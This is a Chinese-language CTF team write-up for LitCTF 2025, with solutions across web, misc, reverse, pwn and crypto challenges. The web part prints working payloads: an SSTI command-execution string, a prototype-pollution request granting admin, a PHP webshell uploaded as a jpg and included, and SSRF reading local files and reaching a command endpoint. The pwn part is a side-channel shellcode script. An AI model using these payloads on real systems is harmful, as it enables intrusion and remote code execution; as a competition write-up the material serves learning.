---
title: LitCTF 2025 不知道 WP
date: 2025-05-26 14:00:00
tags: [cry,web,re,pwn,misc]
categories: wp
typora-root-url: ./..
---

# LitCTF 2025 WriteUp

战队名：不_知道

**排名：2**

# Web

## nest_js

username 和 password 错误时输出不同。burp 起一个 intruder 爆。

弱密码：admin/password

## 星愿信箱

{% raw %}
过滤了{{}}那用{%%}。别的正常 SSTI 就行。
{% endraw %}

```
{%print(g.pop.__globals__.__builtins__.__import__('so'[::-1]).popen('nl ``/*``').read())%}
```

## 多重宇宙日记

随便注册一个账号，再/profile 看到：

![](/images/CuAXbUettokPfwxbAr9cvCIonGb.png)

得到重要参数 is_Admin。结合题目信息打原型链污染即可。

```bash
POST /api/profile/update HTTP/1.1
Host: node12.anna.nssctf.cn:26368
Content-Length: 99
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://node12.anna.nssctf.cn:26368
Referer: http://node12.anna.nssctf.cn:26368/api/profile
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=bf95866c0c6a8f94e64549e80c26f9e6; connect.sid=s%3AWKQpeKhPOdOUU0sVBpVKJEjJlSspCjUS.cRc0DLcTWvrdALBQkC0cUP81xR2KrveWDa9JTinBfxg
Connection: keep-alive

{"settings":{"theme":"1","language":"1","__proto__":{"isAdmin":true}},"__proto__":{"isAdmin":true}}
```

随后访问管理员面板即可。

![](/images/GMx6bja2ooksEaxUv9CcONYsnkf.png)

## ez_file

弱密码：admin/password

![](/images/G8RFbCnypo7KcyxXlXVcveqEnjg.png)

主页 F12 注意到 file 参数，通过报错信息得知有 include。

直接传一个后缀 jpg 的一句话（内容限制了 php。使用短标签绕过），file 参数包含即可。

```bash
POST /admin.php HTTP/1.1
Host: node8.anna.nssctf.cn:20771
Content-Length: 233
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://node8.anna.nssctf.cn:20771
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHqIjoMP3Rus5Munp
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://node8.anna.nssctf.cn:20771/admin.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=90df1eaf1166d3ee8d63e0980cadb17d
Connection: keep-alive

------WebKitFormBoundaryHqIjoMP3Rus5Munp
Content-Disposition: form-data; name="avatar"; filename="basic_webshell.jpg"
Content-Type: application/octet-stream

<?= system($_GET[1]);?>

------WebKitFormBoundaryHqIjoMP3Rus5Munp--
```

随后包含：

```
http://node9.anna.nssctf.cn:28242/admin.php?file=uploads/basic_webshell.jpg&1=cat%20f*
```

## ez_signin

看 js。找到登陆是 token 的验证算法。用 python 实现一遍：

```python
import requests
import hashlib
import time

def md5(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest()

# Your input values
raw_username = "admin"  # replace with actual username
raw_password = "admin123"  # replace with actual password
secret_key = 'easy_signin'

# Calculate hashes
md5_username = md5(raw_username)
md5_password = md5(raw_password)

short_md5_user = md5_username[:6]
short_md5_pass = md5_password[:6]

timestamp = str(int(time.time() * 1000))  # milliseconds since epoch

# Calculate sign
sign = md5(short_md5_user + short_md5_pass + timestamp + secret_key)

# Prepare request
url = 'http://node11.anna.nssctf.cn:21149/login.php'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Sign': sign
}
data = {
    'username': md5_username,
    'password': md5_password,
    'timestamp': timestamp
}

# Send request
try:
    response = requests.post(url, headers=headers, data=data)
    print(response.text)
    print(response.headers)
except Exception as e:
    print(f"Error: {e}")
```

随后弱密码 admin/admin123 登录。得到 backup/8e0132966053d4bf8b2dbe4ede25502b.php

注意到有 api.js。访问得到一个 api 路由：/api/sys/urlcode.php?url=

读取 8e0132966053d4bf8b2dbe4ede25502b.php 内容：

/api/sys/urlcode.php?url=file:///var/www/html/backup/8e0132966053d4bf8b2dbe4ede25502b.php

```bash
if ($_SERVER['REMOTE_ADDR'] == '127.0.0.1') {
highlight_file(__FILE__);

$name="waf";
$name = $_GET['name'];

if (preg_match('/\b(nc|bash|sh)\b/i', $name)) {
    echo "waf!!";
    exit;
}

if (preg_match('/more|less|head|sort/', $name)) {
    echo "waf";
    exit;
}

if (preg_match('/tail|sed|cut|awk|strings|od|ping/', $name)) {
    echo "waf!";
    exit;
}

exec($name, $output, $return_var);
echo "执行结果：\n";
print_r($output);
echo "\n返回码：$return_var";
} else {
    echo("非本地用户");
}

?>
```

注意到必须是本地请求。那么就靠 api 接口打 SSRF

/api/sys/urlcode.php?url=[http://127.0.0.1/backup/8e0132966053d4bf8b2dbe4ede25502b.php?name=ls%2520.](http://127.0.0.1/backup/8e0132966053d4bf8b2dbe4ede25502b.php?name=ls%2520.).

注意到有

![](/images/SaJcbcVDGoksIAxAtCwcmeAGnPe.png)

访问 327a6c4304ad5938eaf0efb6cc3e53dc.php 得到 flag

# Misc

## Cropping

伪加密。解出来是一堆二维码碎片。搓个脚本：

```python
from PIL import Image
import os

# 配置参数
TILE_SIZE = 80  # 每个小图片的尺寸（根据实际情况调整）
ROWS = 9
COLS = 9
OUTPUT_FILE = 'reconstructed_qrcode.png'

def reconstruct_qrcode():
    # 创建空白画布
    canvas = Image.new('RGB', (COLS * TILE_SIZE, ROWS * TILE_SIZE))
    
    for row in range(ROWS):
        for col in range(COLS):
            try:
                # 构建文件名（支持多种格式）
                filename = f"tile_{row}_{col}.png"
                if not os.path.exists(filename):
                    filename = f"tile_{row}_{col}.jpg"
                
                # 打开碎片图片
                tile = Image.open(filename)
                
                # 计算粘贴位置
                position = (col * TILE_SIZE, row * TILE_SIZE)
                
                # 粘贴到画布
                canvas.paste(tile, position)
                
                print(f"成功处理: {filename}")
            except FileNotFoundError:
                print(f"警告: 找不到文件 tile_{row}_{col}.[png/jpg]")
                # 用红色块标记缺失部分
                missing_tile = Image.new('RGB', (TILE_SIZE, TILE_SIZE), 'red')
                canvas.paste(missing_tile, (col * TILE_SIZE, row * TILE_SIZE))
            except Exception as e:
                print(f"处理 {filename} 时出错: {str(e)}")
    
    # 保存结果
    canvas.save(OUTPUT_FILE)
    print(f"\n二维码已重建，保存为: {OUTPUT_FILE}")
    
    # 显示结果（可选）
    canvas.show()

if __name__ == '__main__':
    reconstruct_qrcode()
```

恢复到：

![](/images/Gm7JbQEFfo1nuDxT0WtcvQ0Cnfg.png)

微信扫一扫即可。

## 灵感菇 🍄 哩菇哩菇哩哇擦灵感菇灵感菇 🍄

看注释，注意到：[https://github.com/ProbiusOfficial/Lingicrypt](https://github.com/ProbiusOfficial/Lingicrypt)

复制进去解码就有了：`python main.py -d XXX`

## 消失的文字

USB 流量 CTF-netA 一把梭：

![](/images/AMCibyt17o2cdzxE2ExcAMpHnvg.png)

压缩包密码：868F-83BD-FF

解出来就是经典的 hidden-word 隐写（文件名也提示了）

[https://hidden-word.top/](https://hidden-word.top/)

![](/images/SGgKb0pZPoPAgsxatHBcgswgned.png)

## 像素中的航班

ccb 决赛在福州，4.28 号，在网站查询 FOC 机场的 4.28 前几天的航班消息。

[https://www.flightera.net/zh/airport/Fuzhou/ZSFZ/departure/2025-04-26%20%2000_00](https://www.flightera.net/zh/airport/Fuzhou/ZSFZ/departure/2025-04-26%20%2000_00)?

可以知道该比赛是郑州学校举办，并且图中观察到是南方航空，可以在 26 号找到目标航班。

LitCTF{cz8289}

![](/images/NmXYb2kCooCcmSxorj5cFV9JnLg.png)

## 洞妖洞妖

pptm，查看宏数据

![](/images/HpIDbCHg2oULAbxB9BccJXFfnmc.png)

一个换表 b64，已知密文无表

```
5uESz7on4R8eyC//
```

查看幻灯片，第一张有个图片，解压提取发现文件末尾有倒置的 zip

有密码，暂时无法破解

其余幻灯片根据解压的 `/ppt/slides/slide?.xml` 发现这里的值有差异

![](/images/C3lSbfskdomEYrxrJnXcAWqjnfb.png)

编写脚本提取

```python
import os
import re
from xml.etree import ElementTree as ET

# 定义正则表达式来匹配<p:transition>标签
# <p:transition spd="slow" advTm="1000"/>
pattern = re.compile(r'<p:transition spd="slow" advTm="(\d+)"/>')

data = ""
# 遍历文件并提取advTm的值
for i in range(2, 457):
    file = f'slide{i}.xml'
    with open(file, 'r', encoding='utf-8') as f:
        content = f.read()
        matches = pattern.findall(content)
        if matches:
            print(f'文件 {file} 中的 advTm 值为: {matches[0]}')
            if matches[0] == "1000":
                data += "1"
            elif matches[0] == "0":
                data += "0"
            else:
                print(f'文件 {file} 中的 advTm 值为: {matches[0]}，不是1000也不是0')
                input()
data_1 = ""
for i in range(65):
    data_1 += " 0"
    data_1 += data[i*7:(i+1)*7]
print(data_1)
```

注意到长度为 455，是 7 的倍数，考虑 ascii 补 0 后得到自定义表

> 不是？这什么 jb 脑洞？

```
CEdcwvZuNmlkJtsrqaV93=7Bzyx654YXWFp0n+MLKjiHgfDAbUeTSORQPoIhG821/
```

获取到压缩包密码

![](/images/Xat8blKnuoUbIcxwPdQcMMq2npd.png)

```
pptandword
```

解压发现 docx，删掉图片全选改色即可

![](/images/VQ4TbhEiQowE3bxgaPbcY0V7nKg.png)

# Reverse

## easy_rc4

RC4 魔改，异或了 0x20

![](/images/JAGBbblPsoeIXNxm8dEck9bDnuc.png)

提取这边密文，cyberchef 解密

![](/images/UatkbsBH6o895IxMSYCc2KcUn03.png)

![](/images/AKCDbx6uOolvH5xdMhGcmynBn0g.png)

LitCTF{71bb2a06417a5306ba297ddcfce7b1b0}

## FeatureExtraction

输入 44 长度字符串，将每个字符转到四字节整数，再进行加密，最后对比密文

![](/images/JGFubpZD9o2A0hxUwh2cNwDynKd.png)

加密是用一个十长度数组当作密钥，然后将双循环进行加密

![](/images/C2vJbfRvCowBuuxNFIucyJGCnXs.png)

提取密钥和密文解密得到 flag

```cpp
#include <iostream>

int main()
{
    unsigned int key[10] = {
        0x0000004C, 0x00000069, 0x00000074, 0x00000043, 0x00000054,
        0x00000046, 0x00000032, 0x00000030, 0x00000032, 0x00000035};

    uint32_t flag[53]{0x00001690, 0x00003E58, 0x00006FF1, 0x000086F0, 0x00009D66, 0x0000AB30, 0x0000CA71, 0x0000CF29,
                      0x0000E335, 0x0000E492, 0x0000F1FD, 0x0000DE80, 0x0000D0C8, 0x0000C235, 0x0000B9B5, 0x0000B1CF,
                      0x00009E9F, 0x00009E86, 0x000096B4, 0x0000A550, 0x0000A0D3, 0x0000A135, 0x000099CA, 0x0000ACC0,
                      0x0000BE78, 0x0000C196, 0x0000BC00, 0x0000B5C3, 0x0000B7F0, 0x0000B465, 0x0000B673, 0x0000B71F,
                      0x0000BBE2, 0x0000CB4F, 0x0000D2AD, 0x0000DE20, 0x0000EC94, 0x0000FC30, 0x000104B8, 0x0000F6EE,
                      0x0000EDC9, 0x0000E385, 0x0000D78B, 0x0000DE19, 0x0000C94C, 0x0000AD14, 0x00007E88, 0x00006BB9,
                      0x00004CC6, 0x00003806, 0x00002DC9, 0x00002398, 0x000019E1};

    uint32_t Dec[44]{};

    for (int i = 0; i < 44; ++i)
    {
        uint32_t pre = 0;
        for (int k = 0; k < i; ++k)
        {
            if (i - k < 10)
            {
                pre += Dec[k] * key[i - k];
            }
        }
        uint32_t numerator = flag[i] - pre;
        Dec[i] = numerator / key[0];
    }

    for (int i = 0; i < 44; ++i)
    {
        printf("%c", (char)Dec[i]);
    }

    return 0;
}
```

LitCTF{1e5a6230-308c-47cf-907c-4bfafdec8296}

## easy_tea

程序中多处 jz jnz 以及 call $+5 的花，都同样 nop 去除即可。

![](/images/IEBObymHloGLN6xeuvhcaceDnld.png)

将输入字符串进行 tea 加密再与密文进行对比，v4 是 key，v3 是密文

![](/images/JzqcbMsT3osxpvxl51ncwI4rnqh.png)

![](/images/BnoBb3b7WoLWwwxjkPZcqvirnWd.png)

抄出 tea 代码，改成解密模式进行解密

```cpp
#include <iostream>

int __cdecl sub_E148D0(unsigned int *_a1_, uint32_t *_a2_)
{
    int result;      // eax
    unsigned int v3; // [esp+D0h] [ebp-2Ch]
    unsigned int v4; // [esp+DCh] [ebp-20h]
    int i;           // [esp+E8h] [ebp-14h]
    int v6;          // [esp+F4h] [ebp-8h]

    v6 = 0;
    v4 = *_a1_;
    v3 = _a1_[1];
    v6 = 32 * 0x114514;
    for (i = 0; i < 32; ++i)
    {
        v3 -= (_a2_[3] + (v4 >> 5)) ^ (v6 + v4) ^ (_a2_[2] + 16 * v4);
        v4 -= (_a2_[1] + (v3 >> 5)) ^ (v6 + v3) ^ (*_a2_ + 16 * v3);
        v6 -= 0x114514;
    }
    *_a1_ = v4;
    result = 4;
    _a1_[1] = v3;
    return result;
}

int main()
{
    uint32_t v4[5]{};
    uint32_t v3[10]{};
    v4[0] = 0x11223344;
    v4[1] = 0x55667788;
    v4[2] = 0x99AABBCC;
    v4[3] = 0xDDEEFF11;
    v3[0] = 0x977457FE;
    v3[1] = 0xDA3E1880;
    v3[2] = 0xB8169108;
    v3[3] = 0x1E95285C;
    v3[4] = 0x1FE7E6F2;
    v3[5] = 0x2BC5FC57;
    v3[6] = 0xB28F0FA8;
    v3[7] = 0x8E0E0644;
    v3[8] = 0x68454425;
    v3[9] = 0xC57740D9;
    for (int i = 0; i < 5; i++)
    {
        sub_E148D0((uint32_t *)((uint8_t *)v3 + i * 8), v4);
    }
    printf("%.40s\n", v3);
    return 0;
}
```

LitCTF{590939df61690383a47ed1bc6ade9d51}

## pickle

用 python 代码进行解析 pickle

```python
import dill

def load_and_inspect_dill_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            loaded_object = dill.load(f)

            if callable(loaded_object):
                try:
                    import dis
                    if hasattr(loaded_object, '__code__'):
                        dis.dis(loaded_object)

                        for const in loaded_object.__code__.co_consts:
                            print(f"- {repr(const)}")

                        for name in loaded_object.__code__.co_names:
                            print(f"- {name}")

                except Exception as e:
                    print(f"Could not decompile function bytecode: {e}")

            elif isinstance(loaded_object, (dict, list, tuple)):
                print("\nLoaded object is a collection (dict/list/tuple).")
                print("Content:")
                print(loaded_object)

                extracted_strings = []
                if isinstance(loaded_object, dict):
                    for k, v in loaded_object.items():
                        if isinstance(k, str):
                            extracted_strings.append(k)
                        if isinstance(v, str):
                            extracted_strings.append(v)
                elif isinstance(loaded_object, (list, tuple)):
                    for item in loaded_object:
                        if isinstance(item, str):
                            extracted_strings.append(item)

                if extracted_strings:
                    print("\nExtracted strings from the collection:")
                    for s in extracted_strings:
                        print(f"- {s}")

            else:
                print(f"\nLoaded object is of type {type(loaded_object)}. Content:")
                print(loaded_object)


            if isinstance(loaded_object, (list, tuple)) and all(isinstance(x, int) for x in loaded_object):
                print("\nThis object appears to be a list/tuple of integers, potentially the encrypted flag:")
                print(loaded_object)
                try:
                    potential_bytes = bytes(loaded_object)
                    print(f"Potential bytes: {potential_bytes}")
                    print(f"Potential ASCII/UTF-8 string: {potential_bytes.decode('utf-8', errors='ignore')}")
                except ValueError:
                    print("Could not convert to bytes (values out of range 0-255).")
                except UnicodeDecodeError:
                    print("Could not decode to UTF-8.")


    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
    except dill.UnpicklingError as e:
        print(f"Error: Cannot unpickle file '{file_path}'. It might be corrupted or not a valid dill file. Details: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")



load_and_inspect_dill_file('challenge.pickle')
```

得到以下输出

```markdown
5           0 RESUME                   0

  6           2 LOAD_GLOBAL              1 (NULL + input)
             12 CACHE
             14 LOAD_CONST               1 ('input your flag > ')
             16 UNPACK_SEQUENCE          1
             20 CALL                     1
             28 CACHE
             30 STORE_SUBSCR
             34 CACHE
             36 CACHE
             38 CACHE
             40 CACHE
             42 CACHE
             44 CACHE
             46 CACHE
             48 CACHE
             50 CACHE
             52 UNPACK_SEQUENCE          0
             56 CALL                     0
             64 CACHE
             66 STORE_FAST               0 (user_input)

  8          68 BUILD_LIST               0
             70 STORE_FAST               1 (decrypted)

  9          72 LOAD_GLOBAL              5 (NULL + range)
             82 CACHE
             84 LOAD_GLOBAL              7 (NULL + len)
             94 CACHE
             96 LOAD_FAST                0 (user_input)
             98 UNPACK_SEQUENCE          1
            102 CALL                     1
            110 CACHE
            112 UNPACK_SEQUENCE          1
            116 CALL                     1
            124 CACHE
            126 GET_ITER
        >>  128 FOR_ITER                34 (to 200)

 10         132 LOAD_FAST                0 (user_input)
            134 LOAD_FAST                2 (i)
            136 BINARY_SUBSCR
            140 CACHE
            142 CACHE
            144 CACHE
            146 LOAD_CONST               2 (6)
            148 BINARY_OP               10 (-)
            152 STORE_FAST               3 (b)

 11         154 LOAD_FAST                1 (decrypted)
            156 STORE_SUBSCR
            160 CACHE
            162 CACHE
            164 CACHE
            166 CACHE
            168 CACHE
            170 CACHE
            172 CACHE
            174 CACHE
            176 CACHE
            178 LOAD_FAST                3 (b)
            180 UNPACK_SEQUENCE          1
            184 CALL                     1
            192 CACHE
            194 POP_TOP
            196 JUMP_BACKWARD           35 (to 128)

 13         198 BUILD_LIST               0
        >>  200 LOAD_CONST               3 ((85, 84, 174, 227, 132, 190, 207, 142, 77, 24, 235, 236, 231, 213, 138, 153, 60, 29, 241, 241, 237, 208, 144, 222, 115, 16, 242, 239, 231, 165, 157, 224, 56, 104, 242, 128, 250, 211, 150, 225, 63, 29, 242, 169))
            202 LIST_EXTEND              1
            204 STORE_FAST               4 (fflag)

 14         206 BUILD_LIST               0
            208 LOAD_CONST               4 ((19, 55, 192, 222, 202, 254, 186, 190))
            210 LIST_EXTEND              1
            212 STORE_FAST               5 (key_ints)

 16         214 LOAD_CONST               5 (<code object encrypt at 0x0000000003B26430, file "d:\code\PYTHON\IPParser1.py", line 16>)
            216 MAKE_FUNCTION            0
            218 STORE_FAST               6 (encrypt)

 23         220 PUSH_NULL
            222 LOAD_FAST                6 (encrypt)
            224 LOAD_FAST                4 (fflag)
            226 LOAD_FAST                5 (key_ints)
            228 UNPACK_SEQUENCE          2
            232 CALL                     2
            240 CACHE
            242 STORE_FAST               7 (encrypted_flag)

 25         244 LOAD_FAST                1 (decrypted)
            246 LOAD_FAST                7 (encrypted_flag)
            248 COMPARE_OP               2 (<)
            252 CACHE
            254 POP_JUMP_IF_FALSE       17 (to 290)

 26         256 LOAD_GLOBAL             11 (NULL + print)
            266 CACHE
            268 LOAD_CONST               6 ('Good job! You made it!')
            270 UNPACK_SEQUENCE          1
            274 CALL                     1
            282 CACHE
            284 POP_TOP
            286 LOAD_CONST               0 (None)
            288 RETURN_VALUE

 28     >>  290 LOAD_GLOBAL             11 (NULL + print)
            300 CACHE
            302 LOAD_CONST               7 ("Nah, don't give up!")
            304 UNPACK_SEQUENCE          1
            308 CALL                     1
            316 CACHE
            318 POP_TOP
            320 LOAD_CONST               0 (None)
            322 RETURN_VALUE

Disassembly of <code object encrypt at 0x0000000003B26430, file "d:\code\PYTHON\IPParser1.py", line 16>:
 16           0 RESUME                   0

 17           2 BUILD_LIST               0
              4 STORE_FAST               2 (result)

 18           6 LOAD_GLOBAL              1 (NULL + range)
             16 CACHE
             18 LOAD_GLOBAL              3 (NULL + len)
             28 CACHE
             30 LOAD_FAST                0 (flag_bytes)
             32 UNPACK_SEQUENCE          1
             36 CALL                     1
             44 CACHE
             46 UNPACK_SEQUENCE          1
             50 CALL                     1
             58 CACHE
             60 GET_ITER
        >>   62 FOR_ITER                56 (to 178)

 19          66 LOAD_FAST                0 (flag_bytes)
             68 LOAD_FAST                3 (i)
             70 BINARY_SUBSCR
             74 CACHE
             76 CACHE
             78 CACHE
             80 LOAD_FAST                1 (key)
             82 LOAD_FAST                3 (i)
             84 LOAD_GLOBAL              3 (NULL + len)
             94 CACHE
             96 LOAD_FAST                1 (key)
             98 UNPACK_SEQUENCE          1
            102 CALL                     1
            110 CACHE
            112 BINARY_OP                6 (%)
            116 BINARY_SUBSCR
            120 CACHE
            122 CACHE
            124 CACHE
            126 BINARY_OP               12 (^)
            130 STORE_FAST               4 (b)

 20         132 LOAD_FAST                2 (result)
            134 STORE_SUBSCR
            138 CACHE
            140 CACHE
            142 CACHE
            144 CACHE
            146 CACHE
            148 CACHE
            150 CACHE
            152 CACHE
            154 CACHE
            156 LOAD_FAST                4 (b)
            158 UNPACK_SEQUENCE          1
            162 CALL                     1
            170 CACHE
            172 POP_TOP
            174 JUMP_BACKWARD           57 (to 62)

 21         176 LOAD_FAST                2 (result)
        >>  178 RETURN_VALUE
- None
- 'input your flag > '
- 6
- (85, 84, 174, 227, 132, 190, 207, 142, 77, 24, 235, 236, 231, 213, 138, 153, 60, 29, 241, 241, 237, 208, 144, 222, 115, 16, 242, 239, 231, 165, 157, 224, 56, 104, 242, 128, 250, 211, 150, 225, 63, 29, 242, 169)
- (19, 55, 192, 222, 202, 254, 186, 190)
- <code object encrypt at 0x0000000003B26430, file "d:\code\PYTHON\IPParser1.py", line 16>
- 'Good job! You made it!'
- "Nah, don't give up!"
- input
- encode
- range
- len
- append
- print
```

发现加密是字符-6，然后再与(19, 55, 192, 222, 202, 254, 186, 190)进行 xor 加密

解密逆向计算

```python
enc = [85, 84, 174, 227, 132, 190, 207, 142, 77, 24, 235, 236, 231, 213, 138, 153, 60, 29, 241, 241, 237, 208, 144, 222, 115, 16, 242, 239, 231, 165, 157, 224, 56, 104, 242, 128, 250, 211, 150, 225, 63, 29, 242, 169]
key = [19, 55, 192, 222, 202, 254, 186, 190]

dec = []
for i, byte in enumerate(enc):
    key_byte = key[i % len(key)]
    dec.append(byte ^ key_byte)

flag = ''.join([chr(b + 6) for b in dec])

print(f"{flag}")
```

LitCTF{6d518316-5075-40ff-873a-d1e8d632e208}

## Robbie Wanna Revenge

ce 附加，并且激活 mono 功能，点击 Dissect mono

![](/images/EROUb1ZcaoJqGNxbUGRc8V68nQf.png)

在 Assembly-CSharp.dll 模块里面的 GameManager 类中可以找到一个 PlayerWon 的方法。

![](/images/MyghbfTF8ozAo5xvLJCc3q7Qnqc.png)

右键 invoke 调用，就可以在游戏界面看到 flag

![](/images/K3DbbwDdBomFphxJ0oicsoYrneA.png)

![](/images/DAdybThQhoZiUHxQdjhcU8dTnjd.png)

LitCTF{Rm4ldulG05le0xaN4_LITCTF2025_Wa4jhzlZ05cm0qhF4}

# Pwn

## test_your_nc

输入 $0 就有 shell

## shellcode

测信道爆破

```python
from pwn import *

context(arch='amd64',os='linux')
context.terminal = ["tmux", "splitw", "-h"]
#io=remote()

r = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
s = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug(script=""):
    gdb.attach(io, gdbscript=script)

io=0
def find(i, c):
    global io
    io=remote('node8.anna.nssctf.cn', 20901)
    #io=process("./chal")
    sc=asm("""
    movabs rax, 0x67616C66
    push 0
    push rax
    push rsp
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall #open("flag.txt", 0, 0);
    mov rsi, rdi
    mov rdi, rax
    xor rax, rax
    mov rdx, 0x100
    syscall #read(0, rsp, 0x100);
    mov al, [rsp+{}]
    cmp al, {}
    jbe $
    """.format(i, c))

    io.sendafter(":", sc)
    io.recv()
    try:
        io.recv(timeout=2)
        io.close()
        return True
    except EOFError:
        io.close()
        return False

#debug("break *main+120\nc")
i = 0
flag = ''
while True:
    l = 0x20
    r = 0x80
    while l <= r:
        m = (l + r) // 2
        if find(i, m):
            r = m - 1
        else:
            l = m + 1

    if l==0:
        break
    flag += chr(l)
    info("win!!!!!!!!!!!!!!!!!!!!!!!!! ")
    info(flag)
    i += 1

info("flag: "+flag)
```

# Crypto

## Basic

n 是素数

```python
# python3.11.4
from Crypto.Util.number import *

n = 150624321883406825203208223877379141248303098639178939246561016555984711088281599451642401036059677788491845392145185508483430243280649179231349888108649766320961095732400297052274003269230704890949682836396267905946735114062399402918261536249386889450952744142006299684134049634061774475077472062182860181893
e = 65537
c = 22100249806368901850308057097325161014161983862106732664802709096245890583327581696071722502983688651296445646479399181285406901089342035005663657920475988887735917901540796773387868189853248394801754486142362158369380296905537947192318600838652772655597241004568815762683630267295160272813021037399506007505

d = inverse(e,n-1)
m = pow(c,d,n)
print(long_to_bytes(m))
# LitCTF{ee2c30dfe684f13a6e6c07b9ec90cc2c}
```

## Leak

dp 高位泄露，e 和 dp 满足

![](/images/GD3YbC936oDSiHxKdOGcItdfnih.png)

这里给的 dp 是高位，所以有

![](/images/WIyJbgQmdoEJtIxM4GYcEgrMnhc.png)

在模 p 下有

![](/images/LStibsThVolYWGx31vrcI4BHnAc.png)

k 和 e 是一个数量级，二元 copper 得解

```python
# sage10.6
from Crypto.Util.number import *
import gmpy2
import itertools

def small_roots(f, bounds, m=1, d=None):
    if not d:
        d = f.degree()
        print(d)
    R = f.base_ring()
    N = R.cardinality()
    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)
    G = Sequence([], f.parent())
    for i in range(m + 1):
        base = N ^ (m - i) * f ^ i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)
    B, monomials = G.coefficient_matrix()
    monomials = vector(monomials)
    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)
    B = B.dense_matrix().LLL()
    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1 / factor)
    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B * monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots
    return []

e = 1915595112993511209389477484497
n = 12058282950596489853905564906853910576358068658769384729579819801721022283769030646360180235232443948894906791062870193314816321865741998147649422414431603039299616924238070704766273248012723702232534461910351418959616424998310622248291946154911467931964165973880496792299684212854214808779137819098357856373383337861864983040851365040402759759347175336660743115085194245075677724908400670513472707204162448675189436121439485901172477676082718531655089758822272217352755724670977397896215535981617949681898003148122723643223872440304852939317937912373577272644460885574430666002498233608150431820264832747326321450951
c = 5408361909232088411927098437148101161537011991636129516591281515719880372902772811801912955227544956928232819204513431590526561344301881618680646725398384396780493500649993257687034790300731922993696656726802653808160527651979428360536351980573727547243033796256983447267916371027899350378727589926205722216229710593828255704443872984334145124355391164297338618851078271620401852146006797653957299047860900048265940437555113706268887718422744645438627302494160620008862694047022773311552492738928266138774813855752781598514642890074854185464896060598268009621985230517465300289580941739719020511078726263797913582399
leak = 10818795142327948869191775315599184514916408553660572070587057895748317442312635789407391509205135808872509326739583930473478654752295542349813847128992385262182771143444612586369461112374487380427668276692719788567075889405245844775441364204657098142930
leak <<= 180
R.<x,y> = PolynomialRing(Zmod(n),implementation='generic')
f = e * (leak + x) + (y - 1)
res = small_roots(f,(2^180,2^101),m=2,d=4)
print(res)
for root in res:
    dp_low = root[0]
    dp = leak + dp_low
    tmp = pow(2,e*dp,n) - 2
    p = gmpy2.gcd(tmp,n)
    q = n // p
    d = inverse(e,(p-1)*(q-1))
    m = pow(c,d,n)
    print(long_to_bytes(m))
# LitCTF{03ecda15d1a89b06454c6050c1bd489f}
```

## baby

由题意知

![](/images/UqXmbuYcUowj04xYjNGcukRzn7f.png)

所以

![](/images/OYWtbWVB6oRPbXx3PRTcP9LUn1e.png)

即

![](/images/PrL2bdRn4o0po4xe6aDcXvYynNh.png)

造格

![](/images/VLGcbzMYqoaRy6xVc26cxa9Kndb.png)

做一点参数调整即可

```python
# sage10.6
from Crypto.Util.number import *

g = 7835965640896798834809247993719156202474265737048568647376673642017466116106914666363462292416077666356578469725971587858259708356557157689066968453881547
data = 2966297990428234518470018601566644093790837230283136733660201036837070852272380968379055636436886428180671888655884680666354402224746495312632530221228498
i = 128
Ge = Matrix(ZZ,[
    [1,data],
    [0,g]
])
Ge[:,-1] *= 2^i
m,t = Ge.LLL()[0]
m,t = abs(m),abs(t) // 2^i
if t.bit_length() == 150:
    print(long_to_bytes(m))
# LitCTF{56008a819331c9f3608a718327b7e6ce}
```

## ez_math

GL(2,p)的阶是

![](/images/YRtcbav6BoREXFx2CD0cUXq1nEh.png)

其他维度的阶可以参考：[https://tover.xyz/p/Order-GLnFp/](https://tover.xyz/p/Order-GLnFp/)。

求 e 模这个阶的逆元，再乘方即可恢复 A

```python
# sage10.6
from Crypto.Util.number import *

e = 65537
p = 8147594556101158967571180945694180896742294483544853070485096002084187305007965554901340220135102394516080775084644243545680089670612459698730714507241869
B = [[2155477851953408309667286450183162647077775173298899672730310990871751073331268840697064969968224381692698267285466913831393859280698670494293432275120170, 4113196339199671283644050914377933292797783829068402678379946926727565560805246629977929420627263995348168282358929186302526949449679561299204123214741547], [3652128051559825585352835887172797117251184204957364197630337114276860638429451378581133662832585442502338145987792778148110514594776496633267082169998598, 2475627430652911131017666156879485088601207383028954405788583206976605890994185119936790889665919339591067412273564551745588770370229650653217822472440992]]

B = Matrix(GF(p),B)
phi = p*(p-1)*(p+1)
d = inverse(e,phi)
A = B**d
m = A[0][0]
print(long_to_bytes(int(m)))
# LitCTF{13dd217e-9a67-4093-8a1b-d2592c45ba82}
```

## Math

由题意知

